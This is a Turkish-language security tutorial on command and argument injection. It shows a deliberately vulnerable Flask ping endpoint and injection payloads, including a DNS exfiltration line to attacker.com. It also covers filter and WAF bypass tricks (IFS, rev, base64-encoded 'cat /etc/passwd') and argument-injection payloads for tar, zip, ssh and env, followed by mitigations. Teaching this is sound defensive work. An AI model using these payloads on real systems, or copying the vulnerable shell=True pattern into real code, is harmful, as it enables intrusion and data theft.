# Command Injection & Argument Injection
Command Injection, web uygulamalarının kullanıcıdan aldığı girdiyi yeterli doğrulama veya filtreleme yapmadan doğrudan işletim sistemi komutuna iletmesi sonucu ortaya çıkan kritik bir güvenlik açığıdır. Bu zafiyet sayesinde saldırgan, uygulamanın çalıştığı işletim sistemi üzerinde uygulamanın yetkileriyle (çoğunlukla www-data, apache, nginx) arbitrary command execution gerçekleştirebilir.

Command Injection genellikle aşağıdaki koşullarda görülür:
- Kullanıcı girdisinin system(), exec(), shell_exec(), os.system() gibi OS komut çalıştırma fonksiyonlarına parametre olarak verilmesi
- Girdi doğrulama ve sanitize mekanizmalarının eksik veya hatalı olması
- İşletim sistemi komutlarının shell üzerinden çağrılması (örn: /bin/sh -c "komut")

Bu zafiyetin istismarı sonucunda saldırgan, dosya sistemi üzerinde okuma/yazma, ağ bağlantıları kurma, hassas verileri sızdırma gibi saldırılar gerçekleştirebilir.

# Command Injection Saldırısının İşleyişi
Aşağıda, Command Injection zafiyetine sahip bir Flask uygulaması örneği bulunmaktadır. Yorum satırları, kodun işleyişini adım adım açıklar. Bu örnek, kullanıcı girdisinin doğrudan işletim sistemi komutuna iletilmesi sonucu ortaya çıkan güvenlik açığını göstermektedir.

```python
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/ping', methods=['GET'])
def ping():
    ip = request.args.get('ip')  # /ping?ip=127.0.0.1 ile kullanıcı IP gönderir
    command = 'ping -c 1 ' + ip # Ping komutu oluşturuluyor
    # subprocess.run ile komut çalıştırılıyor. shell=True nedeniyle Command Injection riski var
    result = subprocess.run(command, shell=True, capture_output=True, text=True) # ip adresini eklediği ping komutunu çalıştırır
    return f"<pre>{result.stdout}</pre>"  # Çıktı ekrana yazdırılıyor


if __name__=='__main__': 
   app.run(debug=True) 
```

Geliştirici, kodun şu şekilde çalıştırılacağını varsayar:
```url
http://example.com/ping?ip=google.com
```

Ancak bir saldırgan, shell operatörlerini kullanarak kolayca RCE elde edebilir:
```url
http://example.com/ping?ip=google.com;whoami
```

Bu istek çalışacaktır çünkü kullanıcı girdisi üzerinde herhangi bir filtreleme yapılmamaktadır ve komut olduğu gibi çalıştırılmaktadır. Aşağıda kullanılabilecek bazı parametre örnekleri bulunmaktadır:
```bash
; whoami
& whoami &
&& whoami
| whoami
`whoami`
$(whoami)
|| whoami
\n whoami
```

## Blind Command Injection
Bazı uygulamalarda çıktıyı göremezsiniz. Bu durumda zaman tabanlı veya dışa veri sızdırma yöntemleri kullanılır. Örnekler:
- Zaman tabanlı:
```url
http://example.com/ping?ip=127.0.0.1; sleep 5
```
Yanıtın gecikmesi zafiyeti doğrular.

- DNS/HTTP exfiltration:
```url
http://example.com/ping?ip=127.0.0.1; nslookup $(whoami).attacker.com
```

Sistem bilgisi saldırgan sunucusuna gönderilir.

# Command Injection’da Filtre Bypass Teknikleri
Command Injection testlerinde bazen uygulamalar belirli karakterleri veya komutları filtreler. Bu durumda klasik payload’lar çalışmaz. İşte farklı bypass teknikleri ve mantıkları:
## {IFS} (Internal Field Separator)
- Ne işe yarar: Boşluk karakterleri filtrelendiğinde kullanılabilir.
- Mantık: {IFS} POSIX/Linux ortamlarında boşluk yerine geçer. Regex veya whitelist filtrelerini atlatmak için idealdir.
Örnek:
```bash
ping${IFS}-c${IFS}1${IFS}127.0.0.1
```

Burada boşluk yerine ${IFS} kullanıldı, komut hâlâ çalışır.

## Karakter ve Substring Manipülasyonları
Bazı filtreler ;, / veya belirli karakterleri engeller. Karakterleri substring veya array manipülasyonu ile bypass edebiliriz.

Örnekler:
- Linux / karakteri:
```bash
echo ${PATH:0:1}   # PATH değişkeninin ilk karakteri
```

- ; karakteri (Linux):
```bash
echo ${LS_COLORS:10:1}
```
3. Blacklist Komutları Bypasslamak
- Mantık: Filtre belirli kelimeleri engelliyorsa, stringi parçalayıp yeniden birleştirebiliriz.

Linux Örnekleri:
```bash
w'h'o'am'i
w"h"o"am"i
who$@ami
(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi"; printf %s "${a,,}")
```

## rev Komutu
- Mantık: Filtre belirli komut kelimelerini engelliyorsa, kelimeyi ters yazıp rev ile düzeltebiliriz.

Örnek:
```bash
$(rev<<<'imaohw')
```

'imaohw' → ters yazılmış whoami, rev ile shell’de düzeltip çalıştırılır.

## Base64 Encoding
- Mantık: Payload’ı Base64’e encode edip shell içinde decode ederek çalıştırmak, filtreleri veya WAF’ları atlatır.

Örnek:
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk==)
```

"Y2F0IC9ldGMvcGFzc3dk==" → cat /etc/passwd komutunu temsil eder. Filtre doğrudan komutu göremez.

# Command Injection Zafiyetini Önlemek
## shell=False kullanmak
subprocess gibi modüllerde shell=True kullanmak, kullanıcı girdisinin doğrudan kabuk komutuna aktarılması anlamına gelir ve saldırıya açıktır. shell=False kullanarak komut ve parametreleri ayrı bir liste olarak ver, böylece kabuk yorumlaması devre dışı kalır.
```python
import subprocess

# Güvensiz
subprocess.run(f"ls {user_input}", shell=True)

# Güvenli
subprocess.run(["ls", user_input], shell=False)
```

## shlex.quote veya benzeri escaping fonksiyonları
Kullanıcı girdisi bir şekilde komut satırına geçmek zorundaysa, özel karakterleri kaçırarak güvenli hâle getir. Bu, özellikle shell=True zorunluysa kritik bir önlemdir.
```python
import subprocess, shlex

safe_input = shlex.quote(user_input)
subprocess.run(f"ls {safe_input}", shell=True)
```

# Argument Injection
Argüman enjeksiyonu (bazı kaynaklarda parameter injection veya flag injection olarak da adlandırılır), bir yazılımın başka bir bileşene komut çalıştırmak için oluşturduğu stringi doğru şekilde ayırmaması durumunda ortaya çıkar.
Temel fark
- Komut enjeksiyonu: Kullanıcının girdiği değerler shell tarafından yorumlanır; yeni bir shell örneği çalıştırılır veya kontrol operatörleri (;, &&, |) değerlendirilir.
- Argüman enjeksiyonu: Yeni bir shell çalıştırmaya gerek yoktur; kullanıcı kontrollü argümanlar, mevcut komutun parametrelerini bozacak şekilde geçer.

## Neden kritik?
- Kod incelemelerinde kolaylıkla gözden kaçabilir.
- Black-box testlerde genellikle atlanır.
- Kullanıcı değerleri tek tırnak içine alınsa bile, bazı opsiyonlar veya flagler hala enjeksiyon için kullanılabilir.

Shell’de komut yerine koymayı önlemek için tek tırnak veya escaping yeterli olabilir. Ancak argüman enjeksiyonu, parametreler olarak değerlendirilme durumunu kapsar; yani komut enjeksiyonuna karşı yapılan kaçışlar bu açığı önlemeyebilir.

## Örnek Payloadlar
Aşağıdaki örneklerde kullanıcı kontrollü argümanlar, komutları veya dosya yolunu manipüle edecek şekilde geçiyor:
```bash
env '--split-string=sh -c "id > /tmp/pwned"' foo
git archive '--output=/tmp/foo' ## Arbitrary File Output (AFO)
tar '--checkpoint=1' '--checkpoint-action=exec="sh shell.sh"'
zip '-TmTT="$(id>/tmp/foo)foooo".zip' './a.zip' './a.txt'
ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
```

Her örnek, mevcut komutun argümanlarını kullanıcı kontrollü bir şekilde manipüle ederek ek komut çalıştırmayı gösteriyor.

# Nasıl Önlenir?
- komut argümanlarını shell’e göndermeyin
- exec() veya subprocess gibi fonksiyonlarda string yerine argüman listesi kullanın.
- Kullanıcı girdisini doğrudan parametre/flag olarak iletmeyin
- Gerekliyse whitelist ile doğrulayın (ör. sadece belirli flag veya değerler).
- Harici komutları minimum yetkilerle çalıştırın
- Gereksiz PATH erişimleri, yazma izinleri ve environment değişkenlerini devre dışı bırakın.
- Library fonksiyonlarını tercih edin. Örn. arşiv açmak için tar komutunu çağırmak yerine dilin kendi ZIP/TAR kütüphanesini kullanın.